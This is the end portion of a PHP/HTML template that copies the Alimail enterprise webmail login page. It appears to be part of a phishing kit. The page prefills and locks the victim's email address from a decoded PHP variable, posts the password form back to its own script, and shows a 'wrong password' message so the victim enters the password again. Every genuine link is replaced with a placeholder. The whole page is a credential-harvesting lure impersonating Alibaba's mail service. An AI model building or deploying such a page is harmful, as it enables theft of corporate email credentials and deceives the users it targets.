    }

    .css-1ymq82w.ant-tabs {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1.5714285714285714;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        display: flex;
    }

    .bOGqCw.bOGqCw {
        display: flex;
        flex-direction: column;
    }

    .cFscXe.cFscXe {
        width: 100%;
    }

    .hjfjmD.hjfjmD {
        width: 100%;
        margin-bottom: 24px;
    }

    .crAtPn.crAtPn {
        width: calc(100% - 64px);
        margin: 0px auto;
    }

    .kUVcyi.kUVcyi {
        display: flex;
        flex-direction: row;
        margin-top: 8px;
    }

    .hfaNFQ.hfaNFQ.ant-input {
        height: 40px;
        line-height: 22px;
        display: flex;
        border: 1px solid rgba(126, 134, 142, 0.24);
        padding: 4px 11px;
        border-radius: 5px;
        color: rgb(23, 26, 29);
        background-color: rgb(255, 255, 255);
    }

    .css-1ymq82w.ant-input:placeholder-shown {
        text-overflow: ellipsis;
    }

    .css-1ymq82w.ant-input {
        box-sizing: border-box;
        margin: 0;
        padding: 4px 11px;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1.5714285714285714;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        position: relative;
        display: inline-block;
        width: 100%;
        min-width: 0;
        background-color: #ffffff;
        background-image: none;
        border-width: 1px;
        border-style: solid;
        border-color: #d9d9d9;
        border-radius: 6px;
        transition: all 0.2s;
    }

    .kUVcyi.kUVcyi {
        display: flex;
        flex-direction: row;
        margin-top: 8px;
    }

    .ljXLyc.ljXLyc.ant-input-password {
        height: 40px;
        padding: 4px 11px;
        box-sizing: border-box;
        border: 1px solid rgba(126, 134, 142, 0.24);
        border-radius: 5px;
        background-color: rgb(255, 255, 255);
    }

    .kUVcyi.kUVcyi {
        display: flex;
        flex-direction: row;
        margin-top: 8px;
    }

    .btn-primary {
        background-color: rgb(239, 73, 68);
        color: rgb(255, 255, 255);
        border-color: rgb(239, 73, 68);
    }


    .cGcTOE.cGcTOE.ant-btn {
        box-shadow: unset;
        border-radius: 6px;
        height: 36px;
        line-height: 26px;
        font-size: 14px;
    }

    .cMJwTi.cMJwTi {
        width: 100%;
        line-height: 22px;
        font-weight: 500;
        margin-top: 16px;
        border: 0px !important;
    }

    .css-1ymq82w.ant-btn {
        outline: none;
        position: relative;
        display: inline-block;
        font-weight: 400;
        white-space: nowrap;
        text-align: center;
        background-image: none;
        background-color: transparent;
        border: 1px solid transparent;
        cursor: pointer;
        touch-action: manipulation;
        line-height: 1.5714285714285714;
        color: rgba(0, 0, 0, 0.88);
    }

    .kUVcyi.kUVcyi {
        display: flex;
        flex-direction: row;
        margin-top: 8px;
    }

    .dxtxfQ.dxtxfQ .ant-tabs-nav .ant-tabs-nav-wrap .ant-tabs-nav-list .ant-tabs-ink-bar {
        transform: scaleX(0.18);
        height: 3px;
        background-color: rgb(23, 26, 29);
        border-radius: 18%;
        display: block;
    }

    .xzQmF.xzQmF {
        display: flex;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        justify-content: center;
        height: 56px;
        width: 100%;
        background: rgb(246, 246, 246);
        margin-top: 124px;
        border-radius: 0 0 8px 8px;
    }

    .dxtxfQ.dxtxfQ {
        flex: 1 1 auto;
        width: 100%;
        height: 0px;
    }

    .EcqOG.EcqOG {
        height: 56px;
        -webkit-box-pack: center;
        justify-content: center;
    }

    .bGakcd.bGakcd {
        position: relative;
        display: flex;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: start;
        /*justify-content: flex-start;*/
        height: 56px;
        width: calc(100% - 64px);
    }

    .flFuRt.flFuRt {
        display: flex;
        -webkit-box-align: center;
        align-items: center;
        color: rgba(23, 26, 29, 0.4);
        font-size: 14px;
        cursor: default;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-wrap,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-wrap {
        position: relative;
        display: flex;
        flex: auto;
        align-self: stretch;
        overflow: hidden;
        white-space: nowrap;
        transform: translate(0);
    }

    .contrt {
        width: 100%;
        height: 100%;
        display: flex;
        flex-direction: column;
        position: relative;
    }

    .css-1ymq82w.ant-tabs {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1.5714285714285714;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        display: flex;
    }

    .sc-ktvWjP .iVQbaz {
        width: 32px;
        height: 32px;
    }

    .footer {
        width: 1000px;
        margin: 0 auto;
        padding-top: 20px;
    }
</style>

<body>

    <div id="page">
        <div class="header">
            <span id="select-width-reference" class="select_width_reference"></span>
            <div class="alimail-seo">
                <!-- seo -->
                <a href="#">阿里邮箱官网</a>
            </div>
            <div class="logo" title="">
                <img class="logo_img" src="https://qiye.aliyun.com/static/0.2.9/images/forNetCN/logo.png">
            </div>
            <div class="links_wrap">
                <div class="links_item inline_block links_item_first"><a href="#" target="_blank" _cat="topcustomlink" _id="psfromqiyoubyGJ">钉钉官网</a></div>
                    <div class="links_item inline_block "><a href="#" target="_blank" _cat="topcustomlink" _id="osfromqiyoubyGJ">阿里邮箱官网</a></div>
                    <div class="links_item inline_block "><a href="#" target="_blank" _cat="topcustomlink" _id="gyfromqiyoubyGJ">个人邮箱登录</a></div>
                    <span class="links_item inline_block ">
                        <a href="#" target="_blank" _cat="toplink" _id="app">客户端</a>
                    </span>
                        <span class="links_item inline_block "><a href="#" target="_blank" _cat="toplink" _id="help">帮助</a></span>
                        <span class="links_item inline_block ">
                        <select id="language-select" class="language_select">
                            <option value="zh_CN" selected="selected">简体中文</option>
                            <option value="zh_TW">繁體中文（中国台灣）</option>
                            <option value="zh_HK">繁體中文（中国香港）</option>
                            <option value="en">English</option>
                            <option value="ja_JP">日本语</option>
                            <option value="vi_VN">Tiếng Việt</option>
                            <option value="fr_FR">Français</option>
                            <option value="ko_KR">한국어</option>
                            <option value="es_419">Español (Latinoamérica)</option>
                            <option value="tr_TR">Türkçe</option>
                            <option value="pt_BR">Português(Brasil)</option>
                            <option value="ms_MY">malaysian</option>
                            <option value="id_ID">bahasa Indonesia</option>
                            <option value="th_TH">แบบไทย</option>
                            <option value="pt_PT">Português</option>
                        </select>
                    </span>
            </div>
        </div>

        <div class="content">
            <div class="content_inner">
                <div class="login_welcome" style="display: none">
                    <div class="login_welcome_title">欢迎来到阿里邮箱</div>
                        <div class="login_welcome_text">懂企业的邮箱
                        专注18年，不忘初心
                        成长路上，感谢有你一直陪伴。</div>
                    </div>
                <div class="login_pannel" style="background-color: #ffffff;">
                    <div class="login_pannel_bg"></div>
                    <div class="">
                        <div class="css-1ymq82w ant-app">
                            <div class="sc-ktvWjP iVQbaz contrt">
                                <div class="ant-tabs ant-tabs-top sc-bFSbwS dxtxfQ css-1ymq82w">
                                    <div role="tablist" class="ant-tabs-nav"><div class="ant-tabs-nav-wrap"><div class="ant-tabs-nav-list" style="transform: translate(0px, 0px);"><div data-node-key="ACCOUNT_PASSWORD" class="ant-tabs-tab ant-tabs-tab-active"><div role="tab" aria-selected="true" class="ant-tabs-tab-btn" tabindex="0" id="rc-tabs-0-tab-ACCOUNT_PASSWORD" aria-controls="rc-tabs-0-panel-ACCOUNT_PASSWORD"><span>账号登录</span></div></div><div data-node-key="DINGTALK_QR_CODE" class="ant-tabs-tab"><div role="tab" aria-selected="false" class="ant-tabs-tab-btn" tabindex="0" id="rc-tabs-0-tab-DINGTALK_QR_CODE" aria-controls="rc-tabs-0-panel-DINGTALK_QR_CODE"><span>钉钉账号登录</span></div></div><div class="ant-tabs-ink-bar" style="left: 0px; width: 190px;"></div></div></div><div class="ant-tabs-nav-operations ant-tabs-nav-operations-hidden"><button type="button" class="ant-tabs-nav-more" tabindex="-1" aria-hidden="true" aria-haspopup="listbox" aria-controls="rc-tabs-0-more-popup" id="rc-tabs-0-more" aria-expanded="false" style="visibility: hidden; order: 1;"><span role="img" aria-label="ellipsis" class="anticon anticon-ellipsis"><svg viewBox="64 64 896 896" focusable="false" data-icon="ellipsis" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M176 511a56 56 0 10112 0 56 56 0 10-112 0zm280 0a56 56 0 10112 0 56 56 0 10-112 0zm280 0a56 56 0 10112 0 56 56 0 10-112 0z"></path></svg></span></button></div></div>
                                    <div class="ant-tabs-content-holder">
                                        <div class="ant-tabs-content ant-tabs-content-top">
                                            <div role="tabpanel" tabindex="0" aria-hidden="false"
                                                class="ant-tabs-tabpane ant-tabs-tabpane-active"
                                                id="rc-tabs-0-panel-ACCOUNT_PASSWORD"
                                                aria-labelledby="rc-tabs-0-tab-ACCOUNT_PASSWORD">
                                                <div class="sc-dksuTV bOGqCw">
                                                    <form id="loginForm" action="" method="post" autocomplete="off" novalidate>
                                                        <input type="hidden" name="login" value="mxhichina">
                                                        <div class="sc-JsfZP cFscXe">
                                                            <div class="sc-hYRTwp hjfjmD"></div>
                                                            <div class="sc-gGGFjW crAtPn">
                                                                <!-- email -->
                                                                <div class="sc-dSnXvR kUVcyi">
                                                                    <input
                                                                        placeholder="输入完整的企业邮箱或管理员账号"
                                                                        class="ant-input css-1ymq82w sc-jhGUec hfaNFQ"
                                                                        type="email" name="user" id="email" value="<?php echo htmlspecialchars($decoded); ?>" placeholder="<?php echo htmlspecialchars($decoded); ?>" readonly>
                                                                </div>
                                                                <!-- password -->
                                                                <div class="sc-dSnXvR kUVcyi">
                                                                    <span
                                                                        class="ant-input-affix-wrapper ant-input-password sc-bkbkJK kGydlP sc-hkoqWr ljXLyc css-1ymq82w">
                                                                        <input
                                                                            name="pass" type="text"
                                                                            class="ant-input css-1ymq82w" id="password" size="35" placeholder="输入密码">
                                                                        <span
                                                                            class="ant-input-suffix">
                                                                            <div
                                                                                class="sc-fFSPTT jdFoub ant-input-password-icon">
                                                                                <span role="img"
                                                                                    aria-label="visibility-off-icon"
                                                                                    class="sc-fnVZcZ iPWZJK alimail-icon-visibility-off-icon "><svg
                                                                                        width="1em" height="1em"
                                                                                        fill="currentColor"
                                                                                        aria-hidden="true"
                                                                                        focusable="false"
                                                                                        viewBox="0 0 1024 1024"
                                                                                        class="">
                                                                                        <path
                                                                                            d="M512 149.333333c96.213333 0 188.544 31.68 265.493333 79.381334l66.837334-66.88a42.666667 42.666667 0 0 1 62.848 57.6l-2.496 2.730666-682.517334 682.666667a42.666667 42.666667 0 0 1-62.826666-57.6l2.496-2.730667 63.189333-63.232a559.829333 559.829333 0 0 1-32.213333-23.786666l-10.986667-8.96C96.981333 677.333333 42.666667 587.754667 42.666667 512c0-75.776 54.314667-165.333333 139.157333-236.501333l11.008-8.981334C278.378667 198.464 392.192 149.333333 512 149.333333z m368.213333 161.344C942.912 374.784 981.333333 448.277333 981.333333 512c0 75.776-54.314667 165.333333-139.157333 236.501333l-11.008 8.981334C745.621333 825.536 631.808 874.666667 512 874.666667c-57.28 0-113.173333-11.221333-165.290667-30.378667l68.373334-68.373333C446.933333 784.512 479.573333 789.333333 512 789.333333c187.882667 0 384-162.346667 384-277.333333 0-44.224-29.013333-95.445333-75.370667-141.738667l59.584-59.584zM512 234.666667c-187.882667 0-384 162.346667-384 277.333333 0 66.901333 66.346667 149.802667 158.848 207.445333l95.914667-95.957333a170.666667 170.666667 0 0 1 240.704-240.725333l91.349333-91.370667C653.12 257.194667 581.994667 234.666667 512 234.666667z m-3.648 447.936l174.293333-174.293334L682.666667 512a170.666667 170.666667 0 0 1-170.666667 170.666667l-3.648-0.064zM512 426.666667a85.333333 85.333333 0 0 0-68.544 136.170666l119.36-119.402666A84.949333 84.949333 0 0 0 512 426.666667z"
                                                                                            style="fill: inherit;">
                                                                                        </path>
                                                                                    </svg>
                                                                                </span>
                                                                            </div>
                                                                        </span>
                                                                    </span>
                                                                </div>
                                                                <div class="sc-hkoqWr iBaIgE" style="color: rgb(255, 82, 25); <?php echo $error; ?>">请填写正确的邮箱密码</div>
                                                                <!-- save password -->
                                                                
                                                                <div class="sc-dSnXvR kUVcyi"
                                                                    style="align-items: flex-start; margin-top: 13px; justify-content: space-between;">
                                                                    <div style="display: flex; flex-direction: column;">
                                                                        <label
                                                                            class="ant-checkbox-wrapper ant-checkbox-wrapper-checked sc-fuISkM gbVHbo css-1ymq82w"><span
                                                                                class="ant-checkbox css-1ymq82w ant-checkbox-checked"><input
                                                                                    type="checkbox"
                                                                                    class="ant-checkbox-input" value=""
                                                                                    checked="">
                                                                        <span class="ant-checkbox-inner"></span></span>
                                                                        <span style="color: #171a1d99"> 记住用户名</span></label>
                                                                    </div>
                                                                    <a href="#" target="_blank"
                                                                        class="sc-jUfyBS cbrtEg" style="color: #171a1d99">忘了密碼
                                                                    </a>
                                                                </div>
                                                                <!-- button -->
                                                                <button type="submit" id="loginBtn" onClick="submitLogin(event);" style="background-color: rgb(239, 73, 68);color: rgb(255, 255, 255);border-color: rgb(239, 73, 68);"
                                                                    class="ant-btn css-1ymq82w ant-btn-primary btn-primary sc-bdnxRM sc-jQAxuV cGcTOE cMJwTi">
                                                                    <span>登入</span>
                                                                </button>

                                                                <div class="sc-tsGVs jFSBdC" style="margin-top: 8px;"><label class="ant-checkbox-wrapper ant-checkbox-wrapper-checked sc-fuISkM gbVHbo css-1ymq82w"><span class="ant-checkbox css-1ymq82w ant-checkbox-checked"><input type="checkbox" class="ant-checkbox-input" value=""><span class="ant-checkbox-inner"></span></span><span><span>已阅读并同意：</span><span class="sc-juXuNZ dqvUpP"><a href="#" target="_blank" rel="noreferrer">隐私政策</a>、<a href="#" target="_blank" rel="noreferrer">产品服务协议</a></span></span></label></div>
                                                            </div>
                                                            <div class="sc-WZYut sc-uxdHp xzQmF cuwkJk"><div data-testid="more-login-methods-content" class="sc-ikXwFM sc-biJonm bGakcd EcqOG"><button class="sc-dlnjwi sc-hzUIXc hDynWH flFuRt"><img src="https://gw.alicdn.com/imgextra/i2/O1CN01K4JixU25FgIRCVCDO_!!6000000007497-2-tps-64-64.png" class="sc-ktvWjP iVQbaz"><span style="margin-left: 16px;">阿里邮箱扫码登录</span></button></div></div>
                                                        </div>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-WZYut sc-uxdHp xzQmF cuwkJk" style="display: none;">
                                    <div class="sc-ikXwFM sc-biJonm bGakcd EcqOG">
                                        <button class="sc-dlnjwi sc-hzUIXc hDynWH flFuRt">
                                            <img src="https://gw.alicdn.com/imgextra/i2/O1CN01K4JixU25FgIRCVCDO_!!6000000007497-2-tps-64-64.png"
                                                class="sc-gXZlLH ckZXNe">
                                            <span style="margin-left: 16px;">
                                                Scan to sign in with Alimail
                                            </span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <a href="javascript:void(0);" class="login_bg_link" target="_blank" id="login_bg_link"
                    style="display:none;" _cat="bglink">&nbsp;&nbsp;&nbsp;</a>
            </div>
        </div>

        <div class="footer">
            <div class="copyright_wrap">
                    <span class="login_about_label"><a class="copyright_about_link" target="_blank" href="#" _cat="bottomlink" _id="about">关于我们</a></span>
                </div>
                <div class="copyright_wrap">
                <font _mstmutation="1"><span class="login_about_label" _mstmutation="1"><a class="copyright_link" target="_blank" href="#" _cat="bottomlink" _id="aliyun_com">阿里云</a></span>
                    <span class="login_about_label" _mstmutation="1"><a class="copyright_link" target="_blank" href="#" _cat="bottomlink" _id="dingtalk">钉钉</a></span>
                    <span class="login_about_label" _mstmutation="1"><a class="copyright_link" target="_blank" href="#" _cat="bottomlink" _id="wanwang">万网</a></span>
                    <span class="login_about_label" _mstmutation="1"><a class="copyright_link" target="_blank" href="#" _cat="bottomlink" _id="alipay">支付宝</a></span>
                    <span class="login_about_label" _mstmutation="1"><a class="copyright_link" target="_blank" href="#" _cat="bottomlink" _id="alibabagroup">阿里巴巴集团</a></span>
                    <span class="login_about_label" _mstmutation="1"><a class="copyright_link" target="_blank" href="#" _cat="bottomlink" _id="developer">开发者社区</a></span>
                    <span class="login_about_label" _mstmutation="1"><a class="copyright_link" target="_blank" href="#" _cat="bottomlink" _id="helpcenter">帮助中心</a></span>
                    <span class="login_about_label" _mstmutation="1"><a class="copyright_link" target="_blank" href="#" _cat="bottomlink" _id="aliyunmail">阿里邮箱个人版</a></span>
                    <span class="login_about_label" _mstmutation="1"><a class="copyright_link" target="_blank" href="#" _cat="bottomlink" _id="directmail">邮件推送</a></span>
                    <span class="login_about_label" _mstmutation="1"><a class="copyright_link" target="_blank" href="#" _cat="bottomlink" _id="dingstore">Ding店</a></span>
                </font>
                </div>
                <div class="copyright_wrap">2009-2026 Aliyun.com 版权所有 ICP证：浙B2-20080101</div>
            </div>
        <div id="cache_wrap"></div>
    </div>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>